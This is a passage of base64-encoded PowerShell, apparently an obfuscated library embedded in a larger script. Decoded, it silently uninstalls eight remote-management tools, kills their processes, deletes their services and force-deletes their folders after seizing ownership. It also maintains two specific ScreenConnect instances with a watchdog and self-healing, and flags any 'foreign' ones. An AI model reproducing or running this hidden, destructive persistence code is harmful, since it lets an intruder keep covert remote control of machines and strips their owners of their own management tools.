IE5ldHdvcmtzIik7IFByb2Q9QCgnQXRlcmEqJykgfQ0KICAgICAgICBAeyBUYWc9J05pbmphUk1N
JzsgICAgU3ZjPUAoJ05pbmphUk1NQWdlbnQnLCduaW5qYXJtbSonKTsgUHJvYz1AKCdOaW5qYVJN
TUFnZW50KicsJ25pbmphcm1tKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1N
QWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJv
Z3JhbURhdGFcTmluamFSTU1BZ2VudCIpOyBQcm9kPUAoJ05pbmphUk1NKicpIH0NCiAgICAgICAg
QHsgVGFnPSdEYXR0byc7ICAgICAgIFN2Yz1AKCdDZW50cmFTdGFnZScsJ0NhZ1NlcnZpY2UnKTsg
UHJvYz1AKCdDZW50cmFTdGFnZSonLCdEYXR0b1JNTSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xDZW50cmFTdGFnZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxDZW50cmFTdGFnZSIp
OyBQcm9kPUAoJ0RhdHRvKicsJ0NlbnRyYVN0YWdlKicpIH0NCiAgICAgICAgQHsgVGFnPSdSdXN0
RGVzayc7ICAgIFN2Yz1AKCdSdXN0RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNr
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFJ1c3REZXNrIiwiJGVudjpBUFBEQVRBXFJ1c3REZXNrIik7IFByb2Q9QCgnUnVz
dERlc2sqJykgfQ0KICAgICAgICBAeyBUYWc9J1N1cHJlbW8nOyAgICAgU3ZjPUAoJ1N1cHJlbW8q
Jyk7IFByb2M9QCgnU3VwcmVtbyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTdXByZW1v
IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJvZD1AKCdTdXByZW1vKicp
IH0NCiAgICAgICAgQHsgVGFnPSdEV1NlcnZpY2UnOyAgIFN2Yz1AKCdEV0FnZW50JywnZHdhZ2Vu
dConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERXQWdl
bnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6UHJvZ3JhbURhdGFc
RFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJykgfQ0KICAgICAgICBAeyBUYWc9J1pvaG9Bc3Np
c3QnOyAgU3ZjPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob01lZXRpbmcqJyk7IFByb2M9QCgnWm9ob0Fz
c2lzdConLCdab2hvVVJTQionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xab2hvTWVldGlu
ZyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxab2hvTWVldGluZyIpOyBQcm9kPUAoJ1pvaG8g
QXNzaXN0KicpIH0NCiAgICAgICAgQHsgVGFnPSdSZW1vdGVQQyc7ICAgIFN2Yz1AKCdSZW1vdGVQ
QyonKTsgUHJvYz1AKCdSZW1vdGVQQyonLCdSUENTdWl0ZSonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xSZW1vdGVQQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSZW1vdGVQQyIpOyBQ
cm9kPUAoJ1JlbW90ZVBDKicpIH0NCiAgICApDQogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkg
ew0KICAgICAgICAkaGl0ID0gJGZhbHNlDQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wu
UHJvZCkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHJvb3QgaW4gJ0hLTE06XFNPRlRXQVJFXE1p
Y3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcQ3VycmVudFZlcnNp
b25cVW5pbnN0YWxsJykgew0KICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVy
cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAg
ICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCkuRGlzcGxheU5hbWUN
CiAgICAgICAgICAgICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbGlrZSAkcGF0IC1hbmQgJF8u
UFNDaGlsZE5hbWUgLWxpa2UgJ3sqfScpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRwID0g
U3RhcnQtUHJvY2VzcyBtc2lleGVjLmV4ZSAtQXJndW1lbnRMaXN0ICIveCAkKCRfLlBTQ2hpbGRO
YW1lKSAvcW4gL25vcmVzdGFydCIgLVdhaXQgLVBhc3NUaHJ1DQogICAgICAgICAgICAgICAgICAg
ICAgICAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9wcm9kdWN0X3VuaW5zdGFsbGVk
IFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAg
ICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAo
JHBhdCBpbiAkdG9vbC5TdmMpIHsNCiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1lICRwYXQg
LUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAg
ICAgICAgICAgJiBzYy5leGUgc3RvcCAiJCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAg
ICAgICAgICAgICAgU3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyA4MDANCiAgICAgICAgICAgICAg
ICAmIHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICAg
ICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3N2Y19kZWxldGVkICQoJF8u
TmFtZSkgWyQoJHRvb2wuVGFnKV0iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAg
Zm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9jKSB7DQogICAgICAgICAgICBHZXQtUHJvY2VzcyAt
TmFtZSAkcGF0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ew0KICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uSWQgLUZvcmNlIC1FcnJvckFj
dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAk
dHJ1ZTsgTG9nICJybW1fcHJvY19raWxsZWQgJCgkXy5Qcm9jZXNzTmFtZSkgWyQoJHRvb2wuVGFn
KV0iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJGQgaW4gJHRv
b2wuRGlycykgew0KICAgICAgICAgICAgaWYgKCRkIC1hbmQgKFRlc3QtUGF0aCAkZCkpIHsNCiAg
ICAgICAgICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRXJyb3JBY3Rpb24g
U2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRf
LkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhlY3V0YWJsZVBhdGguU3RhcnRzV2l0aCgkZCkgfSB8
DQogICAgICAgICAgICAgICAgICAgIEZvckVhY2gtT2JqZWN0IHsgU3RvcC1Qcm9jZXNzIC1JZCAk
Xy5Qcm9jZXNzSWQgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIH0NCiAgICAg
ICAgICAgICAgICAmIHRha2Vvd24uZXhlIC9GICRkIC9SIC9EIFkgMj4mMSB8IE91dC1OdWxsDQog
ICAgICAgICAgICAgICAgJiBpY2FjbHMuZXhlICRkIC9ncmFudCAnQWRtaW5pc3RyYXRvcnM6Ricg
L1QgL0MgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVy
YWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0K
ICAgICAgICAgICAgICAgIGlmIChUZXN0LVBhdGggJGQpIHsgU3RhcnQtU2xlZXAgLVNlY29uZHMg
MjsgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRkIC1SZWN1cnNlIC1Gb3JjZSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZSB9DQogICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkZCkg
eyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfSBlbHNlIHsgJG4ucm1tKys7ICRoaXQg
PSAkdHJ1ZTsgTG9nICJybW1fZGlyX3JlbW92ZWQgJGQiIH0NCiAgICAgICAgICAgIH0NCiAgICAg
ICAgfQ0KICAgICAgICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5U
YWcpIiB9DQogICAgfQ0KDQogICAgcmV0dXJuICJleHRlcm1pbmF0ZSBzdmM9JCgkbi5zdmMpIHBy
b2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHByb2R1Y3Q9JCgkbi5wcm9kdWN0KSBybW09JCgk
bi5ybW0pIg0KfQ0KDQpmdW5jdGlvbiBVcGRhdGUtU3RhdGUgew0KICAgICRwcmltID0gJG51bGw7
ICRhbHQgPSAkbnVsbA0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1lICdT
Y3JlZW5Db25uZWN0IENsaWVudConKSkgew0KICAgICAgICBpZiAoJHN2Yy5OYW1lIC1tYXRjaCAn
XCgoWzAtOWEtZl17MTZ9KVwpJykgew0KICAgICAgICAgICAgaWYgKCRtYXRjaGVzWzFdIC1lcSAn
NWY2MDEwNTc5ODUyZTUwNycpIHsgJHByaW0gPSAiJCgkc3ZjLlN0YXR1cykiIH0NCiAgICAgICAg
ICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAkYWx0ID0g
IiQoJHN2Yy5TdGF0dXMpIiB9DQogICAgICAgIH0NCiAgICB9DQogICAgJGZvcmVpZ24gPSBAKCkN
CiAgICBmb3JlYWNoICgkc3ZjIGluIChHZXQtU2VydmljZSAtTmFtZSAnU2NyZWVuQ29ubmVjdCBD
bGllbnQqJykpIHsNCiAgICAgICAgaWYgKCRzdmMuTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2
fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4gQCgnNWY2MDEwNTc5ODUyZTUwNycsJ2Y4NjFj
ODE0MGQ0NTM0MjcnKSkgew0KICAgICAgICAgICAgJGZvcmVpZ24gKz0gJG1hdGNoZXNbMV0NCiAg
ICAgICAgfQ0KICAgIH0NCiAgICAkaWQgPSBSZWFkLUlkZW50aXR5DQogICAgJHRhc2tzT2sgPSAw
OyAkdGFza3NUb3RhbCA9IDANCiAgICBmb3JlYWNoICgkayBpbiAnVEFTS19BJywnVEFTS19CJywn
VEFTS19DJywnVEFTS19EJykgew0KICAgICAgICAkdGFza3NUb3RhbCsrDQogICAgICAgICYgc2No
dGFza3MuZXhlIC9RdWVyeSAvVE4gJGlkWyRrXSAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgaWYg
KCRMQVNURVhJVENPREUgLWVxIDApIHsgJHRhc2tzT2srKyB9DQogICAgfQ0KICAgICR3ZCA9IEVu
c3VyZS1XYXRjaGRvZw0KICAgICRwcmV2ID0gQHt9DQogICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0
aCAkV29ya0RpciAnc3RhdGUuanNvbicNCiAgICBpZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgpIHsN
CiAgICAgICAgdHJ5IHsgKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcg
fCBDb252ZXJ0RnJvbS1Kc29uKS5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3Qg
eyAkcHJldlskXy5OYW1lXSA9ICRfLlZhbHVlIH0gfSBjYXRjaCB7fQ0KICAgIH0NCiAgICAkaW5z
dGFsbENvdW50ID0gMQ0KICAgIGlmICgkcHJldi5pbnN0YWxsQ291bnQpIHsgJGluc3RhbGxDb3Vu
dCA9IFtpbnRdJHByZXYuaW5zdGFsbENvdW50IH0NCiAgICBpZiAoJHByZXYucHJpbSAtYW5kICRw
cmV2LnByaW0gLW5lICdSdW5uaW5nJyAtYW5kICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3Rh
bGxDb3VudCsrIH0NCiAgICAkc3RhdGUgPSBbb3JkZXJlZF1Aew0KICAgICAgICBob3N0ICAgICAg
ICAgPSAkZW52OkNPTVBVVEVSTkFNRQ0KICAgICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUp
LlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykNCiAgICAgICAgYnVpbGQgICAgICAgID0g
JEJ1aWxkDQogICAgICAgIHByaW0gICAgICAgICA9ICQoaWYgKCRwcmltKSB7ICRwcmltIH0gZWxz
ZSB7ICdNSVNTSU5HJyB9KQ0KICAgICAgICBhbHQgICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRh
bHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pDQogICAgICAgIGZvcmVpZ24gICAgICA9ICRmb3JlaWdu
DQogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09rDQogICAgICAgIHRhc2tzVG90YWwgICA9
ICR0YXNrc1RvdGFsDQogICAgICAgIHdhdGNoZG9nICAgICA9ICR3ZA0KICAgICAgICBpbnN0YWxs
Q291bnQgPSAkaW5zdGFsbENvdW50DQogICAgICAgIGxhc3RIZWFsICAgICA9ICQoaWYgKCRFeHRy
YSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCdvJykgfSBlbHNlaWYg
KCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0gZWxzZSB7ICRudWxsIH0pDQogICAg
ICAgIG5vdGUgICAgICAgICA9ICRFeHRyYQ0KICAgIH0NCiAgICAoJHN0YXRlIHwgQ29udmVydFRv
LUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1G
b3JjZQ0KICAgIHJldHVybiAkc3RhdGUNCn0NCg0Kc3dpdGNoICgkQWN0aW9uKSB7DQogICAgJ2lu
aXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAkaWQuR2V0RW51bWVy
YXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFsdWUpIiB9IH0NCiAg
ICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRpZC5HZXRFbnVtZXJh
dG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1ZSkiIH0gfQ0KICAg
ICd3YXRjaGRvZycgICAgICAgIHsgSW5zdGFsbC1XYXRjaGRvZyB8IE91dC1OdWxsIH0NCiAgICAn
d2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9DQogICAgJ3N0YXRlJyAgICAgICAg
ICAgeyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgfQ0KICAgICdyZXBh
aXInICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAkRnAgfQ0KICAgICdyZWdpc3RlcmVkJyAg
ICAgIHsgVGVzdC1TQ1JlZ2lzdGVyZWQgJEZwIH0NCiAgICAnZXh0ZXJtaW5hdGUnICAgICB7IElu
dm9rZS1FeHRlcm1pbmF0ZSB9DQp9DQo=
::B64_LIB_END